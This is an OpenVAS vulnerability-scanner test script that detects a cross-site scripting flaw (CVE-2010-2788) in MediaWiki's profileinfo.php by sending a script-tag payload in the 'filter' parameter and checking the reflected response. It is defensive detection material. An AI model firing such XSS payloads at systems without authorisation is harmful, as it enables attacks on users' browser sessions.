###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mediawiki_profileinfo_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# MediaWiki 'profileinfo.php' Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site.
  Impact Level: Application";
tag_affected = "MediaWiki versions before 1.15.5";
tag_insight = "The flaw is caused by improper validation of user-supplied input passed via
  the 'filter' parameter to profileinfo.php, which allows attackers to execute
  arbitrary HTML and script code on the web server.";
tag_solution = "Upgrade to MediaWiki versions 1.16.0 or 1.15.5.
  For updates refer to http://www.mediawiki.org/wiki/Download";
tag_summary = "This host is running MediaWiki and is prone to cross site scripting
  vulnerability.";

if(description)
{
  script_id(801877);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-05-11 15:50:14 +0200 (Wed, 11 May 2011)");
  script_cve_id("CVE-2010-2788");
  script_bugtraq_id(42024);
  script_tag(name:"cvss_base", value:"2.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("MediaWiki 'profileinfo.php' Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check if MediaWiki is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "https://bugzilla.redhat.com/show_bug.cgi?id=620225");
  script_xref(name : "URL" , value : "https://bugzilla.redhat.com/show_bug.cgi?id=620226");
  script_xref(name : "URL" , value : "http://svn.wikimedia.org/viewvc/mediawiki?view=revision&amp;revision=69984");
  script_xref(name : "URL" , value : "http://svn.wikimedia.org/viewvc/mediawiki?view=revision&amp;revision=69952");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!get_port_state(port)) {
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list("/mediawiki", "/wiki", cgi_dirs()))
{
  ## Send and Recieve the response
  sndReq = http_get(item:string(dir, "/index.php/Main_Page"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  ## Confirm MediaWiki
  if("Powered by MediaWiki" >< rcvRes)
  {
    url = string(dir,'/profileinfo.php?filter="><script>alert(document.cookie)',
                     '</script>');

    ## Try XSS and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header: TRUE,
       pattern:"><script>alert\(document.cookie\)</script>"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
